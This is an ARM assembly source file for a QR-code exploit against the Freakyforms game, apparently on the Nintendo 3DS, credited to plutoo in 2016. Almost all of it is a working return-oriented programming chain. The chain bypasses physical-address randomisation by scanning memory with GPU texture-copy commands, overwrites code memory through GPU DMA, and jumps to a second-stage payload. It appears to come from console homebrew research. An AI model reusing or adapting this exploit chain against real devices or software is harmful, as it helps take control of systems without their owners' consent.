/* freakyforms qr code exploit. */
/* plutoo 2016 */
#include "constants.h"

#define MAKE_PTR(addr) (addr - start + FREAKYBIN_LOAD_ADDR)

.macro addvar addr, val
    .word GADGET_R0                   // pop {r0, pc}
        .word MAKE_PTR(\addr)             // r0
    .word GADGET_LDR_R0_R0            // ldr r0, [r0]; bx lr
    .word GADGET_R1                   // pop {r1, pc}
        .word \val                        // r1
    .word GADGET_R4                   // pop {r4, pc}
        .word MAKE_PTR(\addr) - 0x154     // r4
    .word GADGET_ADD_R0_R0_R1__STR_R0_R4_0x154__POP_R4PC
        .word GARBAGE                     // r4
.endm

start:
     /* PASLR bypass: We scan heap until we find where the code ended up in
        physical memory. */
loop_start:
.word GSP_ENQUEUE_CMD_GADGET      // gsp::EnqueueGpuCommand(...)
    .word 4                           // sp_arg0  cmd_type=TEXTURE_COPY
    loop_src_ptr:  .word CODE_SCAN_START // sp_arg1  src_ptr
    loop_dst_ptr1: .word CODE_SCAN_BUF   // sp_arg2  dst_ptr
    .word 0x1000                      // sp_arg3  size
    .word 0                           // sp_arg4  in_dimensions=0
    .word 0                           // sp_arg5  out_dimensions=0
    .word 8                           // sp_arg6  flags=RAW_MEM_COPY
    .word 0                           // sp_arg7  not used
    .word GARBAGE                     // ...
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
    .word GARBAGE                     // r6
    .word GARBAGE                     // r7
    /* Sleep a bit until gpu has finished. */
.word GADGET_R0                   // pop {r0, pc}
    .word 0x100000                    // r0
.word SVC_SLEEP_THREAD_GADGET     // svc::SleepThread(...)
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
    .word GARBAGE                     // r6

    /* Initialize lr. */
.word GADGET_POP_R4LR__BX_LR      // pop {r4, lr}; bx lr
    .word GARBAGE                     // r4
    .word GADGET_NOP                  // pop {pc}
    /* Read 4th u32 for code page and check if it matches pattern. */
.word GADGET_R0                   // pop {r0, pc}
    loop_dst_ptr2: .word (CODE_SCAN_BUF + 0x10) // r0
.word GADGET_LDR_R0_R0            // ldr r0, [r0]; bx lr
.word GADGET_R1                   // pop {r1, pc}
    .word CODE_SCAN_PAGE_SIGNATURE     // r1
.word GADGET_CMP_R0_R1            // cmp r0, r1; bx lr
    /* Overwrite loop_jump_value with 0 if we found the correct signature. */
.word GADGET_R0                   // pop {r0, pc}
    .word MAKE_PTR(loop_jump_value)   // r0
.word GADGET_R1                   // pop {r1, pc}
    .word 0                           // r1
.word GADGET_STREQ_R1_R0          // streq r1, [r0]; bx lr

    addvar loop_src_ptr,0x1000
    addvar final_dst_ptr,0x1000
    /* Increment dst_ptr by the cache line size (0x20). This guarantees that the
       dst_ptr points to non-cached memory every iteration. */
    addvar loop_dst_ptr1,0x20
    addvar loop_dst_ptr2,0x20

    /* Repair gadget that overwrote itself when it was executed.. */
.word GADGET_R0                   // pop {r0, pc}
    .word MAKE_PTR(loop_start)        // r0
.word GADGET_R1                   // pop {r1, pc}
    .word GSP_ENQUEUE_CMD_GADGET      // r1
.word GADGET_STR_R1_R0            // streq r1, [r0]; bx lr

    /* Loop back unless loop_jump_value was overwritten with 0. */
.word GADGET_R1R2R3R4R5           // pop {r1-r5, pc}
    .word GARBAGE                     // r1
    .word GARBAGE                     // r2
    loop_jump_value: .word loop_start - sp_when_adding_r3 // r3
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
.word GADGET_ADD_SP_R3__POP_PC    // loop!
sp_when_adding_r3:

.word GADGET_R0                   // pop {r0, pc}
    .word FREAKYBIN_LOAD_ADDR+0x400   // r0
.word GADGET_R1                   // pop {r1, pc} 
    .word 0x1000                      // r1
    /* Make sure code isn't stuck in cache. */
.word GSP_FLUSH_DATA_CACHE+4      // gsp::FlushDataCache(..)
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
    .word GARBAGE                     // r6
.word GSP_ENQUEUE_CMD_GADGET      // gsp::EnqueueGpuCommand(...)
    .word 4                           // sp_arg0  cmd_type=TEXTURE_COPY
    .word FREAKYBIN_LOAD_ADDR+0x400   // sp_arg1  src_ptr=file_buf+0x400
    final_dst_ptr: .word CODE_SCAN_START_OFFSETTED - 0x1000 // sp_arg2  dst_ptr=code_physaddr
    .word STAGE2_SIZE                 // sp_arg3  size=code_size
    .word 0                           // sp_arg4  in_dimensions=0
    .word 0                           // sp_arg5  out_dimensions=0
    .word 8                           // sp_arg6  flags=RAW_MEM_COPY
    .word 0                           // sp_arg7  not used
    .word GARBAGE                     // ...
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
    .word GARBAGE                     // r6
    .word GARBAGE                     // r7
    /* Sleep a bit until gpu has finished. */
.word GADGET_R0                   // pop {r0, pc}
    .word 0x1000000                   // r0
.word SVC_SLEEP_THREAD_GADGET     // svc::SleepThread(...)
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
    .word GARBAGE                     // r6
    /* Jump to stage2! */
.word STAGE2_CODE_VA

/* Force assembler error if payload becomes greater than 0x400. */
.org 0x400, 0x44
